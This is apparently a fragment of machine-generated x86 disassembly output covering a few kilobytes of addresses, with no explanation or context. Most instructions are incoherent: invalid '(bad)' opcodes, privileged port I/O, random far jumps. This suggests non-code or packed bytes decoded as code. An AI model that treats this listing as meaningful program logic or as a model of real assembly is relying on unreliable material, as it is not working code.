  41948b:	rcr    BYTE PTR [esp+edx*1-0x52659fb9],1
  419492:	sti    
  419493:	jecxz  0x4194db
  419495:	pop    ds
  419496:	mov    WORD PTR [edx],cs
  419498:	jge    0x4194c5
  41949a:	fdivrp st(0),st
  41949c:	xor    al,0xf
  41949e:	fldcw  WORD PTR [esi]
  4194a0:	cld    
  4194a1:	adc    DWORD PTR [esi+eiz*2+0x7bacf114],esi
  4194a8:	mov    BYTE PTR [eax+0x682030f3],bh
  4194ae:	pop    esi
  4194af:	pop    esp
  4194b0:	sbb    BYTE PTR [eax+esi*4+0x33],ah
  4194b4:	xchg   esi,eax
  4194b5:	in     al,dx
  4194b6:	jae    0x419473
  4194b8:	dec    ebx
  4194b9:	or     eax,0x4d78e27c
  4194be:	xlat   BYTE PTR ds:[ebx]
  4194bf:	sbb    bl,BYTE PTR [esi+0x1759da9c]
  4194c5:	dec    ecx
  4194c6:	mov    dh,0xba
  4194c8:	pop    esi
  4194c9:	call   0x5fea0325
  4194ce:	and    al,BYTE PTR [edi-0xe83c055]
  4194d4:	jns    0x4194a4
  4194d6:	and    eax,0x5fcfc0cd
  4194db:	pop    esp
  4194dc:	test   DWORD PTR [esi-0x63],ebp
  4194df:	aam    0x46
  4194e1:	in     eax,dx
  4194e2:	mov    cl,al
  4194e4:	fdiv   DWORD PTR [eax+0x65382cc4]
  4194ea:	cmp    al,0xe9
  4194ec:	dec    eax
  4194ed:	inc    ecx
  4194ee:	pop    ecx
  4194ef:	in     eax,dx
  4194f0:	inc    eax
  4194f1:	cmp    eax,0x13bfc86f
  4194f6:	mov    dx,0xeb9d
  4194fa:	xchg   BYTE PTR [esi+eiz*2+0x5643cd7a],bh
  419501:	jb     0x41956a
  419503:	and    BYTE PTR [edx-0x4e87351a],0x9f
  41950a:	cmp    DWORD PTR [eax+0x7bbda8f],esp
  419510:	mov    ds:0xf54cd318,al
  419515:	fnstenv [eax+0x76d3573b]
  41951b:	fwait
  41951c:	or     dh,bl
  41951e:	jg     0x419569
  419520:	or     dh,BYTE PTR [ebx+0x355d714c]
  419526:	fmul   st(4),st
  419528:	je     0x419508
  41952a:	loopne 0x419510
  41952c:	inc    ebp
  41952d:	mov    ch,0xe
  41952f:	daa    
  419530:	(bad)  
  419531:	sti    
  419532:	add    al,BYTE PTR [esi-0x57]
  419535:	out    0x9b,al
  419537:	outs   dx,BYTE PTR ds:[esi]
  419538:	int3   
  419539:	jnp    0x4194cb
  41953b:	sub    eax,0x2b71a79d
  419540:	pop    ebx
  419541:	fs scas al,BYTE PTR es:[edi]
  419543:	outs   dx,DWORD PTR ds:[esi]
  419544:	jg     0x41950c
  419546:	push   ecx
  419547:	push   0xfffffff6
  419549:	mov    ds:0x2793f615,al
  41954e:	cmp    dh,BYTE PTR [edx+0x5479d24b]
  419554:	inc    esp
  419555:	test   BYTE PTR [esi],ch
  419557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419558:	mov    eax,0xe01f487
  41955d:	push   ebx
  41955e:	in     al,dx
  41955f:	add    DWORD PTR [eax-0x7915b4a8],ebx
  419565:	ret    
  419566:	push   esi
  419567:	(bad)
  41956a:	repz je 0x419538
  41956d:	outs   dx,DWORD PTR ds:[esi]
  41956e:	and    cl,dh
  419570:	add    eax,0xc6d89849
  419575:	xchg   esi,esi
  419577:	mov    esi,0xcecf1410
  41957c:	mov    gs,WORD PTR [ebp+0x2d]
  41957f:	push   edi
  419580:	int    0x4d
  419582:	mov    dl,0xc2
  419584:	sbb    bh,BYTE PTR [ecx+0x23b85d7f]
  41958a:	jl     0x41957b
  41958c:	scas   eax,DWORD PTR es:[edi]
  41958d:	outs   dx,BYTE PTR ds:[esi]
  41958e:	mov    al,ds:0xd1c1535e
  419593:	sub    eax,DWORD PTR [edi+0x39d65402]
  419599:	cmp    al,0x10
  41959b:	xchg   ecx,eax
  41959c:	inc    eax
  41959d:	dec    edx
  41959e:	mov    al,0x64
  4195a0:	jmp    0x419549
  4195a2:	push   edi
  4195a3:	mov    edx,0x7febfd04
  4195a8:	dec    ebp
  4195a9:	push   edx
  4195aa:	sti    
  4195ab:	push   ds
  4195ac:	outs   dx,DWORD PTR ds:[esi]
  4195ad:	dec    esi
  4195ae:	push   ds
  4195af:	imul   esp,DWORD PTR [esp+ebp*4-0x48],0xffffff9e
  4195b4:	sar    BYTE PTR fs:[esi+0x6e568637],1
  4195bb:	pop    es
  4195bc:	adc    DWORD PTR [ebx],esp
  4195be:	aam    0x74
  4195c0:	(bad)  
  4195c1:	gs (bad) 
  4195c3:	imul   esi,DWORD PTR [edx],0x43
  4195c6:	ror    DWORD PTR [ebx],1
  4195c8:	ret    0xa4e8
  4195cb:	out    0xdf,al
  4195cd:	and    al,0xf2
  4195cf:	sar    DWORD PTR [ebx+0x2ae54afe],cl
  4195d5:	jmp    0xd3a3f284
  4195da:	test   cl,0xe9
  4195dd:	fs and al,0x5c
  4195e0:	out    0xda,al
  4195e2:	push   ss
  4195e3:	cwde   
  4195e4:	xchg   edx,eax
  4195e5:	inc    esp
  4195e6:	imul   ecx,DWORD PTR [edi+0x50c7a5fa],0x59
  4195ed:	xchg   ebx,eax
  4195ee:	mov    edi,0xa424d7bb
  4195f3:	pop    ecx
  4195f4:	mov    ah,0x1e
  4195f6:	cdq    
  4195f7:	mov    ebp,0x4388a0b9
  4195fc:	fsubr  DWORD PTR ss:[ebx]
  4195ff:	jmp    0x41962a
  419601:	shl    BYTE PTR [esi-0x551eb197],0x36
  419608:	mov    dh,0xb9
  41960a:	mov    ah,0xec
  41960c:	ret    0xae8
  41960f:	adc    DWORD PTR [edi+eiz*4],esi
  419612:	in     eax,0xe8
  419614:	and    al,0x44
  419616:	(bad)  
  419617:	lea    ebp,[edi+0x55373cb0]
  41961d:	inc    edi
  41961e:	stc    
  41961f:	xchg   esi,eax
  419620:	mov    esp,0x69e04a36
  419625:	xchg   esi,eax
  419626:	sbb    BYTE PTR [ebp+0x63],cl
  419629:	cmc    
  41962a:	and    bl,BYTE PTR [ebx-0x5a]
  41962d:	jbe    0x419698
  41962f:	push   ss
  419630:	and    esp,DWORD PTR [eax+0x8]
  419633:	mov    dh,0x49
  419635:	es call 0xa5e66af2
  41963b:	repz xchg esi,eax
  41963d:	pop    edi
  41963e:	xchg   ecx,eax
  41963f:	sbb    edx,DWORD PTR [ecx+ecx*4-0x7b]
  419643:	jmp    0x41969c
  419645:	imul   edx,esi,0xffffffac
  419648:	outs   dx,BYTE PTR ds:[esi]
  419649:	cmp    dl,al
  41964b:	inc    ebx
  41964c:	mov    edi,0x91f3e21d
  419651:	sbb    al,0x81
  419653:	xor    DWORD PTR [eax-0x6d],edi
  419656:	inc    esi
  419657:	dec    edx
  419658:	add    al,0x2
  41965a:	and    BYTE PTR [esi-0x41],0xad
  41965e:	push   cs
  41965f:	jae    0x4196cd
  419661:	ins    BYTE PTR es:[edi],dx
  419662:	dec    ecx
  419663:	push   ecx
  419664:	pop    edi
  419665:	mov    es,WORD PTR [esp+edi*4-0x25c6a370]
  41966c:	cmp    eax,0xc0e33f0d
  419671:	retf   
  419672:	cmp    BYTE PTR cs:[ecx-0xe372a95],cl
  419679:	jmp    0x4196bf
  41967b:	arpl   WORD PTR [edx-0x79d5fdae],bp
  419681:	shl    BYTE PTR [eax],0xc4
  419684:	test   al,0xa1
  419686:	out    0xdf,eax
  419688:	fdiv   st(7),st
  41968a:	xchg   edx,eax
  41968b:	pop    eax
  41968c:	outs   dx,BYTE PTR ds:[esi]
  41968d:	adc    eax,0x4065ea75
  419692:	or     ebp,DWORD PTR [edx]
  419694:	cmp    BYTE PTR [edi],al
  419696:	mov    esp,0x7d46a5fa
  41969b:	in     eax,0xee
  41969d:	jmp    0x1ec2a82a
  4196a2:	inc    ebp
  4196a3:	mov    ah,0xd5
  4196a5:	dec    ebp
  4196a6:	add    DWORD PTR [eax],edi
  4196a8:	jg     0x4196c7
  4196aa:	mov    dl,0x37
  4196ac:	mov    cl,0x3f
  4196ae:	shl    ch,1
  4196b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b1:	jg     0x4196c0
  4196b3:	sbb    dl,BYTE PTR [edi]
  4196b5:	jnp    0x4196af
  4196b7:	lock dec ecx
  4196b9:	add    ecx,edx
  4196bb:	sbb    al,BYTE PTR [ecx]
  4196bd:	xchg   esp,eax
  4196be:	clc    
  4196bf:	test   al,0xf8
  4196c1:	jne    0x4196ec
  4196c3:	outs   dx,BYTE PTR ds:[esi]
  4196c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196c5:	sbb    ch,BYTE PTR [esi]
  4196c7:	sbb    ebx,ecx
  4196c9:	inc    edx
  4196ca:	mov    ebp,0x5f23e409
  4196cf:	inc    esp
  4196d0:	lds    edi,FWORD PTR [ecx+edx*8]
  4196d3:	mov    dl,0xd2
  4196d5:	retf   0x8a65
  4196d8:	pop    ecx
  4196d9:	imul   edi,edi,0x11cae77d
  4196df:	cld    
  4196e0:	push   es
  4196e1:	ret    
  4196e2:	fs add cl,ch
  4196e5:	dec    edi
  4196e6:	idiv   DWORD PTR [edi+edx*8]
  4196e9:	pop    edi
  4196ea:	repnz push eax
  4196ec:	gs jge 0x41973c
  4196ef:	mov    ebx,0xa8871f89
  4196f4:	test   al,0xba
  4196f6:	(bad)  
  4196f7:	pop    esp
  4196f8:	call   0x1411:0x986066ad
  4196ff:	loope  0x419708
  419701:	addr16 xchg esi,eax
  419703:	mov    edi,0xd6bd2193
  419708:	jmp    0x41971a
  41970a:	pop    esi
  41970b:	gs pop ss
  41970d:	sahf   
  41970e:	mov    eax,0xec9dd918
  419713:	and    ecx,DWORD PTR [ebx+edx*8+0x56488efc]
  41971a:	mov    eax,0x2a4d0584
  41971f:	mov    dh,0x53
  419721:	lods   eax,DWORD PTR ds:[esi]
  419722:	inc    ebp
  419723:	aaa    
  419724:	idiv   DWORD PTR [ebx]
  419726:	into   
  419727:	in     eax,dx
  419728:	xlat   BYTE PTR ds:[ebx]
  419729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41972a:	ret    
  41972b:	mov    ds:0x39480113,eax
  419730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419731:	dec    edi
  419732:	(bad)  
  419733:	or     al,0xc1
  419735:	in     al,dx
  419736:	mov    ecx,0x5f76c99e
  41973b:	pop    eax
  41973c:	fsub   st(7),st
  41973e:	call   0xf9b5fbdb
  419743:	add    eax,0x494f974e
  419748:	xchg   DWORD PTR [ecx+eiz*1+0x22c0feb2],eax
  41974f:	call   0xa0fc43f2
  419754:	push   eax
  419755:	inc    eax
  419756:	pop    esi
  419757:	call   0x7946:0x1193f61b
  41975e:	(bad)  
  41975f:	and    BYTE PTR [ebp+ebp*4-0x2759a7a7],bl
  419766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419767:	sbb    DWORD PTR [edi],esp
  419769:	(bad)  
  41976a:	fmul   QWORD PTR [edi+0x49]
  41976d:	test   BYTE PTR [eax+0x1d4548d5],ch
  419773:	pop    esp
  419774:	sub    eax,DWORD PTR [edi+0x6b]
  419777:	mov    eax,DWORD PTR ds:0x7b98294c
  41977d:	cmp    ecx,eax
  41977f:	xor    BYTE PTR [ecx-0x2e],0x33
  419783:	mov    bh,0x40
  419786:	or     dl,bl
  419788:	jbe    0x4197ff
  41978a:	cdq    
  41978b:	int    0x1e
  41978d:	push   es
  41978e:	jmp    0x13c31666
  419793:	mov    ah,0xf2
  419795:	scas   eax,DWORD PTR es:[edi]
  419796:	gs jnp 0x41971b
  419799:	jb     0x4197af
  41979b:	push   ebp
  41979c:	add    al,ah
  41979e:	jl     0x419720
  4197a0:	ja     0x4197ae
  4197a2:	push   0xffffffcf
  4197a4:	aas    
  4197a5:	jno    0x419768
  4197a7:	mov    dh,dl
  4197a9:	ror    BYTE PTR [eax+esi*8-0x50],1
  4197ad:	ret    0x3311
  4197b0:	ret    0xcd9e
  4197b3:	xchg   esp,eax
  4197b4:	mov    DWORD PTR [eax-0x45760765],esp
  4197ba:	mov    bh,0x8b
  4197bc:	iret   
  4197bd:	retf   
  4197be:	push   esp
  4197bf:	dec    dl
  4197c1:	frstor [edx+0x2df5e64]
  4197c7:	push   edi
  4197c8:	(bad)  
  4197c9:	lods   eax,DWORD PTR ds:[esi]
  4197ca:	nop
  4197cb:	ret    
  4197cc:	leave  
  4197cd:	xor    DWORD PTR [edi],ecx
  4197cf:	je     0x419839
  4197d1:	test   DWORD PTR [ebp-0x6f],ecx
  4197d4:	imul   ebp,DWORD PTR [ecx-0x63bd70f6],0x40
  4197db:	vpcmpeqb xmm6,xmm2,XMMWORD PTR [ebp+0x79]
  4197e0:	pop    eax
  4197e1:	or     al,0xf5
  4197e3:	addr16 mov eax,0x686bf10d
  4197e9:	(bad)  
  4197ea:	dec    esp
  4197eb:	stos   BYTE PTR es:[edi],al
  4197ec:	mov    ah,0x77
  4197ee:	xor    eax,0x8069c8ab
  4197f3:	les    esi,FWORD PTR [ebx]
  4197f5:	mov    ds:0x3615d72f,al
  4197fa:	(bad)  
  4197fb:	lock xchg DWORD PTR [eax+0x31],esp
  4197ff:	and    DWORD PTR ds:0x874a9f67,eax
  419805:	push   0x3896dbbb
  41980a:	mov    edx,0x763e163a
  41980f:	pop    ebp
  419810:	fucomip st,st(2)
  419812:	lea    eax,[edi-0x94f6542]
  419818:	lds    ebx,FWORD PTR [ebx+ecx*8-0x346782ef]
  41981f:	inc    esi
  419821:	or     BYTE PTR [edi+ebx*4],0xf1
  419825:	add    ecx,DWORD PTR [eax-0x50]
  419828:	dec    eax
  419829:	dec    edi
  41982a:	sub    DWORD PTR [edx+0x1fc06459],ebx
  419830:	fadd   DWORD PTR [esi+0x19a76f72]
  419836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419837:	and    DWORD PTR [esi],0x86b40dc3
  41983d:	pushf  
  41983e:	cmp    DWORD PTR [eax-0x5649dcc5],0xd78c9b10
  419848:	mov    BYTE PTR [ebx+0x5dccb9fb],bl
  41984e:	pop    ebp
  41984f:	pop    ds
  419850:	mov    cl,ch
  419852:	push   0x64
  419854:	call   0xdb06:0xbe1f333e
  41985b:	pop    ebx
  41985c:	jne    0x419869
  41985e:	fcomp  DWORD PTR ds:0x65aa8eee
  419864:	inc    edi
  419865:	out    0x4c,al
  419867:	sar    DWORD PTR [ebx+0x7a92bff8],0xcd
  41986e:	and    eax,0x385ab731
  419873:	cmp    edi,edx
  419875:	cdq    
  419876:	xchg   ebp,eax
  419877:	jb     0x41985b
  419879:	(bad)  
  41987a:	in     al,dx
  41987b:	sub    DWORD PTR [esi],eax
  41987d:	aaa    
  41987e:	xchg   edi,eax
  41987f:	xchg   ebx,eax
  419880:	(bad)  
  419881:	retf   
  419882:	scas   eax,DWORD PTR es:[edi]
  419883:	or     ebp,ebx
  419885:	mov    ?,esi
  419887:	push   es
  419888:	stos   BYTE PTR es:[edi],al
  419889:	ret    0x298a
  41988c:	inc    edx
  41988d:	and    al,0x8a
  41988f:	(bad)  
  419890:	leave  
  419891:	sub    DWORD PTR [ebp-0x2c],0x535bcbf
  419898:	fcomi  st,st(3)
  41989a:	scas   al,BYTE PTR es:[edi]
  41989b:	cmp    eax,0x63597685
  4198a0:	int3   
  4198a1:	and    bl,ah
  4198a3:	fild   DWORD PTR [edi-0x7833ed57]
  4198a9:	pop    edx
  4198aa:	test   ch,dl
  4198ac:	inc    edi
  4198ad:	fimul  DWORD PTR [ebp+0x9]
  4198b0:	push   0xa5c17337
  4198b5:	rcl    DWORD PTR [edx],cl
  4198b7:	out    0x31,eax
  4198b9:	in     eax,0x9c
  4198bb:	sti    
  4198bc:	retf   0x5dca
  4198bf:	xlat   BYTE PTR ds:[ebx]
  4198c0:	ret    
  4198c1:	ds inc ecx
  4198c3:	fucomp st(2)
  4198c5:	jns    0x4198fd
  4198c7:	(bad)  
  4198c8:	xchg   esp,eax
  4198c9:	out    0x87,eax
  4198cb:	jmp    esi
  4198cd:	loop   0x41986a
  4198cf:	or     dh,dl
  4198d1:	mov    ah,BYTE PTR [edi+0x24]
  4198d4:	or     al,0x97
  4198d6:	shl    DWORD PTR [ebx],0x8d
  4198d9:	inc    esp
  4198da:	inc    edi
  4198db:	jb     0x419921
  4198dd:	hlt    
  4198de:	jne    0x419941
  4198e0:	mov    ds:0x5660de18,al
  4198e5:	sbb    al,ch
  4198e7:	(bad)  
  4198e8:	or     al,0xa6
  4198ea:	je     0x4198ec
  4198ec:	and    DWORD PTR [esi+eiz*8-0x665ae97d],ebp
  4198f3:	imul   ebp,DWORD PTR [edx-0x66],0xffffff8f
  4198f7:	xchg   edi,eax
  4198f8:	pop    ebp
  4198f9:	pop    edx
  4198fa:	sub    DWORD PTR [eax-0x3c],eax
  4198fd:	mov    cl,0x14
  4198ff:	shr    BYTE PTR ds:0xd6876571,cl
  419905:	pop    ecx
  419906:	mov    DWORD PTR [ecx],ebx
  419908:	push   esp
  419909:	mov    WORD PTR [edi-0x48],cs
  41990c:	mov    dh,0x42
  41990e:	xchg   BYTE PTR [ebx-0x38],bl
  419911:	or     BYTE PTR [esi+0x67],ch
  419914:	xchg   ebp,eax
  419915:	retf   
  419916:	xchg   edi,eax
  419917:	dec    edx
  419918:	jb     0x4198ae
  41991a:	mov    ch,0x40
  41991c:	push   cs
  41991d:	xor    al,0x45
  41991f:	jmp    0x419947
  419921:	cmp    al,BYTE PTR [edx]
  419923:	mul    ebp
  419925:	dec    esi
  419926:	jle    0x4198b4
  419928:	mov    ebp,0x8d270fcc
  41992d:	mov    eax,ds:0xa8026a6a
  419932:	ror    DWORD PTR fs:[ebp+edi*1+0x41],cl
  419937:	jne    0x4198bb
  419939:	cli    
  41993a:	dec    edi
  41993b:	adc    eax,0xac88e31f
  419940:	pop    es
  419941:	jae    0x41994d
  419943:	aam    0xbf
  419945:	pushf  
  419946:	imul   edx,DWORD PTR [edi],0xbd5a7e31
  41994c:	mov    ch,0xa3
  41994e:	clc    
  41994f:	dec    ebp
  419950:	fistp  WORD PTR [ecx+0x50]
  419953:	and    al,0x90
  419955:	lock mov al,0xe7
  419958:	test   BYTE PTR [edi],cl
  41995a:	scas   al,BYTE PTR es:[edi]
  41995b:	retf   
  41995c:	xor    edx,DWORD PTR [ebx]
  41995e:	mov    ch,0x3b
  419960:	pop    ecx
  419961:	out    0xa,eax
  419963:	test   al,0xc3
  419965:	xor    eax,DWORD PTR [edx-0x55]
  419968:	ins    BYTE PTR es:[edi],dx
  419969:	(bad)  
  41996a:	ja     0x419961
  41996c:	pop    esp
  41996d:	test   al,0x56
  41996f:	out    0x1f,al
  419971:	mov    ecx,0x22ee0898
  419976:	outs   dx,DWORD PTR ds:[esi]
  419977:	pop    eax
  419978:	test   eax,0x933ff34d
  41997d:	jmp    0x34ee975b
  419982:	daa    
  419983:	dec    BYTE PTR [ecx+0x5b672b43]
  419989:	mov    esp,0x57ba75b2
  41998e:	mov    dl,BYTE PTR [esi+ebx*1+0x451bf80d]
  419995:	in     al,dx
  419996:	push   0xffffffd4
  419998:	fld    st(6)
  41999a:	and    eax,DWORD PTR [ecx]
  41999c:	mov    bl,0x17
  41999e:	xchg   ebx,eax
  41999f:	cmp    DWORD PTR [esi],ecx
  4199a1:	pop    ebp
  4199a2:	push   0xffffffe0
  4199a4:	cvttps2pi mm5,QWORD PTR [esi+0x42]
  4199a8:	loop   0x419a15
  4199aa:	pusha  
  4199ab:	rcr    BYTE PTR [edx],cl
  4199ad:	adc    dh,BYTE PTR [ebp+eax*8+0x56]
  4199b1:	add    eax,0x74059958
  4199b6:	jmp    0xded4d538
  4199bb:	rcl    DWORD PTR [esi+0x59c246f8],cl
  4199c1:	push   ebp
  4199c2:	push   DWORD PTR [edx+0x1c847907]
  4199c8:	and    esp,DWORD PTR [eax-0x31]
  4199cb:	retf   
  4199cc:	ins    DWORD PTR es:[edi],dx
  4199cd:	xchg   ebp,eax
  4199ce:	mov    dh,ah
  4199d0:	sbb    ebp,DWORD PTR [eax-0x37e71d6d]
  4199d6:	sbb    ebx,ebx
  4199d8:	and    eax,0x85a27884
  4199dd:	mov    ah,0xd7
  4199df:	bound  ebx,QWORD PTR [ebx+esi*1]
  4199e2:	(bad)  
  4199e3:	xlat   BYTE PTR ds:[ebx]
  4199e4:	push   ebp
  4199e5:	inc    esi
  4199e6:	inc    esp
  4199e7:	jge    0x41999a
  4199e9:	loope  0x41997e
  4199eb:	repnz test DWORD PTR es:[edx+0x3eaeb061],edi
  4199f3:	loop   0x419a33
  4199f5:	pop    edx
  4199f6:	push   edx
  4199f7:	jecxz  0x4199d7
  4199f9:	mov    eax,0x3811ad6b
  4199fe:	shl    BYTE PTR [edi],0x8c
  419a01:	sbb    al,dl
  419a03:	lods   eax,DWORD PTR ds:[esi]
  419a04:	mov    WORD PTR [ebx-0x1d],fs
  419a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a08:	out    dx,al
  419a09:	pop    ss
  419a0a:	add    esi,esp
  419a0c:	leave  
  419a0d:	xor    eax,0xab6451ce
  419a12:	dec    edx
  419a13:	xchg   esi,eax
  419a14:	out    0xa,eax
  419a16:	ror    esp,1
  419a18:	sbb    eax,0xa5a8114c
  419a1d:	jp     0x4199f4
  419a1f:	sbb    al,0xb8
  419a21:	or     eax,edx
  419a23:	ucomiss xmm0,DWORD PTR [edx]
  419a26:	or     BYTE PTR [ebx+ebp*4+0x49],ch
  419a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a2b:	(bad)  
  419a2c:	jno    0x4199ff
  419a2e:	test   eax,0x5f2bcd16
  419a33:	mov    al,ds:0xc68beac7
  419a38:	icebp  
  419a39:	xor    DWORD PTR [ebx+eax*1+0x27],ebp
  419a3d:	sub    DWORD PTR [eax+ebp*2+0x73bdc684],eax
  419a44:	into   
  419a45:	add    esp,ebp
  419a47:	inc    ecx
  419a48:	(bad)  
  419a49:	call   DWORD PTR [edi+edx*4-0x13]
  419a4d:	inc    ebx
  419a4e:	push   cs
  419a4f:	or     DWORD PTR [esi],0x5081c1
  419a55:	out    0x7e,al
  419a57:	inc    esp
  419a58:	pop    ebx
  419a59:	pop    eax
  419a5a:	xlat   BYTE PTR ds:[ebx]
  419a5b:	test   BYTE PTR [ecx+0x6cd95b39],ah
  419a61:	xchg   DWORD PTR [esi],edx
  419a63:	ret    0x43d3
  419a66:	inc    ecx
  419a67:	aam    0x3
  419a69:	xchg   DWORD PTR [eax],edi
  419a6b:	sub    bh,dh
  419a6d:	jo     0x419ab8
  419a6f:	xchg   edi,eax
  419a70:	das    
  419a71:	dec    esi
  419a72:	(bad)  
  419a73:	test   al,0xf
  419a75:	mov    ecx,DWORD PTR [eax+0x334fa7bd]
  419a7b:	fwait
  419a7c:	xchg   ebx,eax
  419a7d:	repz inc ebx
  419a7f:	jl     0x419a4f
  419a81:	mov    ebp,0x4214adc4
  419a86:	xchg   edi,eax
  419a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a88:	test   al,0xd2
  419a8a:	pop    esi
  419a8b:	fild   WORD PTR [edi+eax*2-0x7be0fad0]
  419a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a93:	push   esp
  419a94:	das    
  419a95:	adc    DWORD PTR ds:[edx],edx
  419a98:	or     eax,0x97be0623
  419a9d:	mov    BYTE PTR [ebx],bl
  419a9f:	sbb    eax,0xf45e1071
  419aa4:	xor    DWORD PTR [ebx-0x57],0xda3a1a09
  419aab:	retf   0x614f
  419aae:	mov    dh,0x23
  419ab0:	and    DWORD PTR [ecx-0xb5d0fe2],ebp
  419ab6:	inc    ecx
  419ab7:	retf   
  419ab8:	imul   esp,DWORD PTR [edi],0x87d6a8ea
  419abe:	mov    ebp,DWORD PTR [eax-0x3b]
  419ac1:	push   esi
  419ac2:	enter  0x8399,0xca
  419ac6:	scas   al,BYTE PTR es:[edi]
  419ac7:	push   ds
  419ac8:	leave  
  419ac9:	inc    DWORD PTR [esi+0x2]
  419acc:	lea    eax,[ebx-0x58]
  419acf:	inc    ebp
  419ad0:	sbb    ch,BYTE PTR [ebx+0x4d30aa6f]
  419ad6:	or     al,0xc6
  419ad8:	or     al,0x47
  419ada:	es fs pop es
  419add:	dec    eax
  419ade:	sbb    ebx,DWORD PTR [ecx]
  419ae0:	mov    ebp,0xbe62d4d
  419ae5:	into   
  419ae6:	xchg   edi,eax
  419ae7:	in     eax,dx
  419ae8:	jg     0x419aaf
  419aea:	and    dh,BYTE PTR [ecx+0x17]
  419aed:	test   DWORD PTR [esi+0x4b],esi
  419af0:	inc    ebp
  419af1:	inc    edx
  419af2:	ret    0xbe9c
  419af5:	dec    edx
  419af6:	xchg   edx,eax
  419af7:	pop    ss
  419af8:	cmp    BYTE PTR [eax],cl
  419afa:	add    DWORD PTR [edi],edx
  419afc:	and    DWORD PTR [esi+0x1c],edx
  419aff:	xchg   esp,eax
  419b00:	loopne 0x419b17
  419b02:	pop    edi
  419b03:	daa    
  419b04:	push   edx
  419b05:	mov    DWORD PTR [ebx+0x41],esp
  419b08:	add    ch,BYTE PTR [edi]
  419b0a:	mov    esp,0xd5c415a6
  419b0f:	ja     0x419b31
  419b11:	lock retf 0xd521
  419b15:	mov    edx,0x9ff328f0
  419b1a:	out    0xbc,eax
  419b1c:	les    ebx,FWORD PTR [ebx+0x1c292657]
  419b22:	sar    BYTE PTR [edx],1
  419b24:	inc    esi
  419b25:	dec    ecx
  419b26:	fsub   QWORD PTR [ecx+0xe2c66dd]
  419b2c:	push   ds
  419b2d:	aaa    
  419b2e:	mov    edi,0xdf457a89
  419b33:	pop    ss
  419b34:	mul    DWORD PTR [esi+0x72]
  419b37:	push   esp
  419b38:	lea    esp,[edx-0x3f31d566]
  419b3e:	gs pop ds
  419b40:	popa   
  419b41:	les    ebp,FWORD PTR [edx]
  419b43:	ret    
  419b44:	ins    BYTE PTR es:[edi],dx
  419b45:	test   ebx,edx
  419b47:	test   eax,0x4a21558b
  419b4c:	sbb    eax,0x2488d26d
  419b51:	adc    DWORD PTR [edx+ecx*2+0x28],ecx
  419b55:	ror    DWORD PTR [edi-0x62],1
  419b58:	inc    ebp
  419b59:	jecxz  0x419add
  419b5b:	mov    ecx,0x8cb0aa90
  419b60:	mov    cl,0x9a
  419b62:	cmp    al,0x53
  419b64:	inc    bp
  419b66:	shr    eax,1
  419b68:	inc    esi
  419b69:	imul   ebp,DWORD PTR [eax+ecx*4-0x4f],0xffffff97
  419b6e:	dec    edx
  419b6f:	add    BYTE PTR [eax+ebx*1+0x57],cl
  419b73:	push   edx
  419b74:	jae    0x419baa
  419b76:	add    BYTE PTR [edx+0x5166bc0b],ah
  419b7c:	or     al,BYTE PTR [esi+0x4940d171]
  419b82:	repz adc DWORD PTR [edx-0x2822652e],eax
  419b89:	mov    ds:0x8842fe7d,eax
  419b8e:	mov    cl,0xad
  419b90:	mov    al,ds:0x68dd30ed
  419b96:	jae    0x419bee
  419b98:	out    0x9d,eax
  419b9a:	dec    eax
  419b9b:	daa    
  419b9c:	mov    al,ds:0xfffaaa88
  419ba1:	adc    al,0xf
  419ba3:	daa    
  419ba4:	adc    esi,DWORD PTR [ebp-0x29dbfaf6]
  419baa:	or     DWORD PTR [edi-0x226ccdd0],eax
  419bb0:	jns    0x419b3c
  419bb2:	pusha  
  419bb3:	fsubp  st(0),st
  419bb5:	popf   
  419bb6:	pop    edi
  419bb7:	mov    edi,0x12508ce3
  419bbc:	loope  0x419bac
  419bbe:	jmp    0xc552:0xe5508bfc
  419bc5:	push   esi
  419bc6:	cli    
  419bc7:	push   cs
  419bc8:	stos   BYTE PTR es:[edi],al
  419bc9:	mov    bh,0xa2
  419bcb:	dec    edi
  419bcc:	scas   eax,DWORD PTR es:[edi]
  419bcd:	pop    ds
  419bce:	test   al,0x3e
  419bd0:	xor    eax,0x4a8b7b13
  419bd5:	dec    esi
  419bd6:	mov    ebp,DWORD PTR [eax]
  419bd8:	mov    esp,0x87f59ac9
  419bdd:	or     DWORD PTR [esi-0x7c9ffac8],ecx
  419be3:	rol    BYTE PTR [eax+0xf576c9d],cl
  419be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bea:	add    DWORD PTR [ebx+ebp*8-0x25],ecx
  419bee:	stos   BYTE PTR es:[edi],al
  419bef:	pop    ss
  419bf0:	call   0xfdc4:0x4d80f413
  419bf7:	jp     0x419ba3
  419bf9:	or     edx,edx
  419bfb:	into   
  419bfc:	int    0x96
  419bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bff:	or     al,0xd8
  419c01:	fcomp  DWORD PTR [edx-0x6b]
  419c04:	outs   dx,DWORD PTR ds:[esi]
  419c05:	daa    
  419c06:	shl    esp,1
  419c08:	inc    eax
  419c09:	jp     0x419bc7
  419c0b:	jmp    0xd8ce:0x27103a93
  419c12:	clc    
  419c13:	mov    esp,0x4e3505b2
  419c18:	xor    al,0xf2
  419c1a:	xor    eax,0x201bbd7d
  419c1f:	mov    dh,0x57
  419c21:	leave  
  419c22:	ror    dl,1
  419c24:	scas   al,BYTE PTR es:[edi]
  419c25:	cmp    edx,edx
  419c27:	adc    ecx,edx
  419c29:	and    ebp,DWORD PTR [edi-0x4d]
  419c2c:	mov    esp,0xa250a058
  419c31:	addr16 int3 
  419c33:	call   0x9c52f01b
  419c38:	es push ds
  419c3a:	adc    edx,DWORD PTR [eax+0x43f79efb]
  419c40:	sbb    bl,BYTE PTR [ebp+eax*2+0x41]
  419c44:	pop    ebx
  419c45:	mov    ds:0xcc8c7f7d,al
  419c4a:	dec    ebp
  419c4b:	jp     0x419cc8
  419c4d:	nop
